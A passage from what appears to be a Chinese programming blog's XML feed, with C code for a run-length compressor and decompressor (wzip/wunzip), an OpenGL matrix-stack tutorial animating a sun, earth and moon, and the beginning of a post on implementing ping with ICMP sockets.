	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">char</span><span class="token operator">*</span> buffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token class-name">ssize_t</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wzip: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token operator">++</span>cnt<span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
						<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
						<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">&#125;</span>
					ch <span class="token operator">=</span> buffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
					cnt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="wunzip"><a href="#wunzip" class="headerlink" title="wunzip"></a>wunzip</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>相较于编码，解码就简单很多了。使用 <code>fread()</code> 每次读取一个整数 cnt 和一个字符 ch，并使用 for 循环打印 cnt 个 ch 到标准输出即可。</p>
<h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wunzip: file1 [file2 ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> rc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wunzip: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> cnt<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>C</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenGL入门 矩阵堆栈实现简单行星系统</title>
    <url>/2022/03/17/OpenGL%E5%85%A5%E9%97%A8%20%E7%9F%A9%E9%98%B5%E5%A0%86%E6%A0%88%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E8%A1%8C%E6%98%9F%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>本文介绍如何使用矩阵堆栈原理实现简单的行星运行系统。</p>
<span id="more"></span>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>有时我们需要在一个场景中绘制不同的模型，如果这些模型彼此间没有联系，即各模型的位置不会相互影响，那我们只需要单独为每个模型创建合适的变换矩阵，并经过渲染管线将其渲染即可。而对于一个位置会相互影响的系统而言，例如行星运行系统，地球围绕太阳公转，而月球围绕地球公转。处理这样问题的关键在于如何确定各物体变换矩阵，准确来说是<strong>模型-视图矩阵</strong>。而矩阵堆栈可以很好地将这问题简化。<br>所谓矩阵堆栈，就一个用来存储变换矩阵的堆栈结构，栈顶矩阵为栈底矩阵乘上另一个矩阵变换而来，由此，栈底到栈顶形成一个逐步复杂的结构。通常来说，栈底的矩阵为视图矩阵，因为对于一个场景中的每个物体，它们都要经过视图矩阵的变换。逐步往上，由父物体的变换矩阵先入栈，利用栈顶矩阵作为该物体的模型-视图矩阵绘制物体后，再进入其子物体的管线，依次逐步进行。同时，对于不希望由父物体继承给子物体的变换矩阵可以在绘制完父物体后将其出栈。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>对于本文所要研究的行星运行系统，共有三个物体：太阳、地球、月球，它们的依赖关系是：地球围绕太阳公转，而月球围绕地球公转。矩阵堆栈的变换情况如下：</p>
<ol>
<li><p>将视图矩阵压入栈中。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">vMat <span class="token operator">=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">translate</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token operator">-</span>cameraX<span class="token punctuation">,</span> <span class="token operator">-</span>cameraY<span class="token punctuation">,</span> <span class="token operator">-</span>cameraZ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>vMat<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li>
<li><p>构造太阳的模型矩阵，将其与栈顶矩阵相乘后。</p>
</li>
<li><p>将旋转矩阵与栈顶矩阵相乘并入栈以实现太阳的自转效果，将栈顶矩阵作为太阳的模型-视图矩阵，渲染太阳后将栈顶矩阵出栈，移除太阳的旋转变换。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/// &lt;summary></span>
<span class="token comment">/// 绘制太阳</span>
<span class="token comment">/// &lt;/summary></span>
mMat <span class="token operator">=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">translate</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span>sunLocX<span class="token punctuation">,</span> sunLocY<span class="token punctuation">,</span> sunLocZ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*=</span> mMat<span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">rotate</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>currentTime<span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 太阳自转</span>

<span class="token function">drawSphere</span><span class="token punctuation">(</span>sunTexture<span class="token punctuation">)</span><span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 矩阵堆栈中移除太阳自转</span></code></pre></li>
<li><p>将平移矩阵与栈顶矩阵相乘并入栈以实现地球的公转效果，其中平移的坐标的计算利用程序运行时间的三角函数值得到。</p>
</li>
<li><p>将旋转矩阵与缩放矩阵与栈顶矩阵相乘后入栈，实现地球的自转效果并将地球的尺寸缩小，将栈顶矩阵作为地球的模型-视图矩阵，渲染地球后将栈顶矩阵出栈，移除地球的旋转和缩放变换。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/// &lt;summary></span>
<span class="token comment">/// 绘制地球</span>
<span class="token comment">/// &lt;/summary></span>
mvStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">translate</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>currentTime<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>currentTime<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 地球公转</span>
mvStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">rotate</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>currentTime<span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 地球自转</span>
mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">scale</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">0.3f</span><span class="token punctuation">,</span> <span class="token number">0.3f</span><span class="token punctuation">,</span> <span class="token number">0.3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 地球缩放</span>

<span class="token function">drawSphere</span><span class="token punctuation">(</span>earthTexture<span class="token punctuation">)</span><span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 矩阵堆栈中移除地球自转和缩放</span></code></pre></li>
<li><p>与地球类似，将平移矩阵与栈顶矩阵相乘并入栈以实现月球的公转效果。由于月球已经没有子物体，因此无需继续创建新的矩阵，只需要在栈顶矩阵的基础上乘以月球的自转和缩放矩阵，渲染完成后，将矩阵堆栈清空。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/// &lt;summary></span>
<span class="token comment">/// 绘制月球</span>
<span class="token comment">/// &lt;/summary></span>
mvStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">translate</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>currentTime<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.8f</span><span class="token punctuation">,</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>currentTime<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.8f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 月球公转</span>
mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">rotate</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>currentTime<span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 月球自转</span>
mvStack<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">scale</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">0.1f</span><span class="token punctuation">,</span> <span class="token number">0.1f</span><span class="token punctuation">,</span> <span class="token number">0.1f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 月球缩放</span>

<span class="token function">drawSphere</span><span class="token punctuation">(</span>moonTexture<span class="token punctuation">)</span><span class="token punctuation">;</span>
mvStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> mvStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> mvStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 清空矩阵堆栈</span></code></pre></li>
</ol>
<h2 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h2><p><img src="/2022/03/17/OpenGL%E5%85%A5%E9%97%A8%20%E7%9F%A9%E9%98%B5%E5%A0%86%E6%A0%88%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E8%A1%8C%E6%98%9F%E7%B3%BB%E7%BB%9F/galaxy.png"></p>
<h1 id="项目链接"><a href="#项目链接" class="headerlink" title="项目链接"></a>项目链接</h1><p>本项目已上传 github 仓库，如果想要查看项目的完整代码，可以自行访问。</p>
<p><a href="https://github.com/LordaeronESZ/OpenGL_Galaxy">项目链接</a></p>
]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>OpenGL</tag>
        <tag>计算机图形学</tag>
        <tag>矩阵堆栈</tag>
      </tags>
  </entry>
  <entry>
    <title>Ping命令的实现</title>
    <url>/2022/05/31/Ping%E5%91%BD%E4%BB%A4%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>Ping （Packet Internet Groper）是一种因特网包探索器，用于测试网络连接量的程序。本文将基于 Socket 编程，实现一个基本的 Ping 命令程序。</p>
<span id="more"></span>

<h1 id="ICMP-报文分析"><a href="#ICMP-报文分析" class="headerlink" title="ICMP 报文分析"></a>ICMP 报文分析</h1><h2 id="ICMP-报文捕获"><a href="#ICMP-报文捕获" class="headerlink" title="ICMP 报文捕获"></a>ICMP 报文捕获</h2><p>在控制台输入 <code>ping 202.195.147.248</code>，对该目的主机发起请求，可以看到控制台输出了一系列统计信息：4 个数据包全部接收并且往返时间为 5 ms（较短），表明与该主机之间的连接畅通。</p>
<p><img src="/2022/05/31/Ping%E5%91%BD%E4%BB%A4%E7%9A%84%E5%AE%9E%E7%8E%B0/f1.png"></p>
<p>使用 Wireshark 工具捕获 icmp 数据包，为了避免无关数据包的干扰，可以使用 filter 对数据包进行过滤，在上部栏输入 <code>ip.src == 202.195.147.248 or ip.dst == 202.195.147.248</code>，表明只筛选源地址或目的地址为 202.195.147.248 的数据包，最终可以得到数据包的内容。</p>
<p><img src="/2022/05/31/Ping%E5%91%BD%E4%BB%A4%E7%9A%84%E5%AE%9E%E7%8E%B0/f2.png"></p>
<h2 id="Wireshark-数据包分析"><a href="#Wireshark-数据包分析" class="headerlink" title="Wireshark 数据包分析"></a>Wireshark 数据包分析</h2><p>根据 ICMP 报文的格式进行分析: </p>
<ol>
<li>Type：数据包类型，占 1 Byte，为 0x00，代表回送报文。</li>
<li>Code：代码部分，占 1 Byte，为 0x00.</li>
<li>Checksum：检验和，占 2 Bytes，为 0x554c.</li>
<li>Identifier(IE)：占 2 Bytes，为 0x0001.</li>
<li>Identifier(LE)：占 2 Bytes，为 0x0100.</li>
<li>Sequence Number(BE)：占 2 Bytes，为 0x000f.</li>
<li>Sequence Number(LE)：占 2 Bytes，为 0x0f00.</li>
<li>Data：占 32 Bytes，为6162636465666768696a6b6c6d6e6f7071727374757677616263646566676869.</li>
</ol>
<h1 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h1><h2 id="构造-ICMP-报文"><a href="#构造-ICMP-报文" class="headerlink" title="构造 ICMP 报文"></a>构造 ICMP 报文</h2><p>自定义数据结构 icmpHeader 表示 ICMP 报文头部，包含类型、代码、检验和、标识符和序列号。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// ICMP 报文头</span>
<span class="token keyword">struct</span> <span class="token class-name">icmpHeader</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> type<span class="token punctuation">;</span> <span class="token comment">// 类型</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> code<span class="token punctuation">;</span> <span class="token comment">// 代码</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> checkSum<span class="token punctuation">;</span> <span class="token comment">// 检验和</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> id<span class="token punctuation">;</span> <span class="token comment">// 标识符</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> sequence<span class="token punctuation">;</span> <span class="token comment">// 序列号</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<p>填充该报文，类型为 8 表示请求报文。检验和使用特定的算法计算，关于算法的具体内容可以自行查看相关文档，在此不过多赘述。标识符使用进程 id 填充。最后在 ICMP 报文头的尾部，添加 32 字节的数据作为 ICMP 报文的数据部分。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 构造 ICMP 报文</span>
<span class="token keyword">char</span> sendBuf<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
icmpHeader<span class="token operator">*</span> pIcmp <span class="token operator">=</span> <span class="token punctuation">(</span>icmpHeader<span class="token operator">*</span><span class="token punctuation">)</span>sendBuf<span class="token punctuation">;</span>
pIcmp<span class="token operator">-></span>type <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
pIcmp<span class="token operator">-></span>code <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
pIcmp<span class="token operator">-></span>checkSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
pIcmp<span class="token operator">-></span>id <span class="token operator">=</span> <span class="token punctuation">(</span>USHORT<span class="token punctuation">)</span><span class="token double-colon punctuation">::</span><span class="token function">GetCurrentProcessId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
